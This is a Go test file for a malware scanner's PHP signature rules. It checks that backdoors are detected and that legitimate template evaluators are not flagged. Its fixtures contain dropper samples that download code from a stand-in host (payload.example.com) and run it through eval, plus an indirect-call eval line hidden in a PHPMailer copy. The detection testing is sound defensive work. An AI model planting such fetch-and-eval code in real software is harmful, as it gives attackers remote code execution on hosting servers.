package signatures

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Production sample (2026-07-29, staged as index.phps in a WordPress docroot):
// the remote fetch lives in a helper function and the payload runs with an
// HTML-mode prefix, so neither the curl_exec-adjacent pattern nor the
// eval-wrapping pattern in dropper_curl_eval sees it. The fetch and the
// execution sit tens of lines apart and the eval argument is a string literal,
// not the fetched variable.
func TestBackdoorHtmlmodeEval_RemoteFetchHelper(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $content = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ($httpCode === 200) ? $content : false;
}

$url = 'https://payload.example.com/raw.php?id=ZndWqKLSdhQa';
$content = fetchContent($url);

if ($content !== false) {
    eval('?>' . $content);
}
`)

	if !hasRule(scanner.ScanContent(malicious, ".php"), "backdoor_htmlmode_eval") {
		t.Error("backdoor_htmlmode_eval miss: remote fetch feeding eval('?>' . $var) was not detected")
	}
}

// Production sample (planted 2024-07-22, found 2026-08-17 as two identical
// copies on one account): a copied PHPMailer with one line appended deep inside
// it. There is no URL and no fetch -- the payload is rebuilt through an
// indirect call, so the decoder branch is what carries this one.
func TestBackdoorHtmlmodeEval_IndirectCallPayload(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
class SMTP {
    public function client_send($data, $command) {
        $this->setError('');
        eval('?>' . call_user_func($_b64, base64_encode($_out)));
    }
}
`)

	if !hasRule(scanner.ScanContent(malicious, ".php"), "backdoor_htmlmode_eval") {
		t.Error("backdoor_htmlmode_eval miss: indirect-call payload rebuild was not detected")
	}
}

// ".phps" is PHP source by definition -- the extension exists to display it.
// Every PHP rule declares file_types [".php"], so unless the scanner treats the
// two alike a staged payload is read and then matched against nothing. Uses an
// already-matching pattern so this covers extension handling alone.
func TestScannerTreatsPhpsAsPHPSource(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte("<?php\neval(curl_exec($ch));\n")

	if !hasRule(scanner.ScanContent(malicious, ".phps"), "dropper_curl_eval") {
		t.Error("dropper_curl_eval miss: .phps content was not matched against PHP rules")
	}
}

func TestScanFileTreatsPhpsAsPHPSource(t *testing.T) {
	scanner := loadRepoScanner(t)
	target := filepath.Join(t.TempDir(), "payload.PHPS")
	if err := os.WriteFile(target, []byte("<?php eval(curl_exec($ch));"), 0o600); err != nil {
		t.Fatal(err)
	}

	if matches := scanner.ScanFile(target, 1<<20); !hasRule(matches, "dropper_curl_eval") {
		t.Error("dropper_curl_eval miss: ScanFile did not canonicalize the .PHPS source extension")
	}
}

// A staged dropper keeps the same content under an extension a stock handler
// renders as source. Content scanning must not go blind on the extension alone.
func TestBackdoorHtmlmodeEval_UnderPhpsExtension(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
$ch = curl_init('https://payload.example.com/x');
$content = curl_exec($ch);
eval('?>' . $content);
`)

	if !hasRule(scanner.ScanContent(malicious, ".phps"), "backdoor_htmlmode_eval") {
		t.Error("backdoor_htmlmode_eval miss: staged .phps payload was not scanned as PHP")
	}
}

// Twig's Environment.php is the most common carrier of this idiom in the wild:
// it ships inside Elementor, WPML, MailPoet and Breakdance, so it sits on most
// WordPress hosts many times over. It evaluates a local template and never
// reaches the network, which is what both branches require.
func TestBackdoorHtmlmodeEval_TwigStyleLocalTemplate(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
final class Environment {
    public function render($name, array $context = [])
    {
        $source = $this->getLoader()->getSourceContext($name)->getCode();
        return eval('?>' . $this->compileSource($source));
    }
}
`)

	if hasRule(scanner.ScanContent(legit, ".php"), "backdoor_htmlmode_eval") {
		t.Error("backdoor_htmlmode_eval FP: a local template evaluator is not a backdoor")
	}
}

// Documentation links live in docblocks throughout template engines, so a URL
// literal somewhere in the file must not be enough on its own -- it has to sit
// within the window before the eval.
func TestBackdoorHtmlmodeEval_DocblockURLFarFromEval(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
/**
 * Template compiler.
 *
 * @see https://twig.symfony.com/doc/3.x/api.html
 */
class Compiler {
    private $notes = '` + strings.Repeat("a", 600) + `';
    public function render($tpl) {
        return eval('?>' . $tpl);
    }
}
`)

	if hasRule(scanner.ScanContent(legit, ".php"), "backdoor_htmlmode_eval") {
		t.Error("backdoor_htmlmode_eval FP: a docblock URL far from the eval is not remote provenance")
	}
}
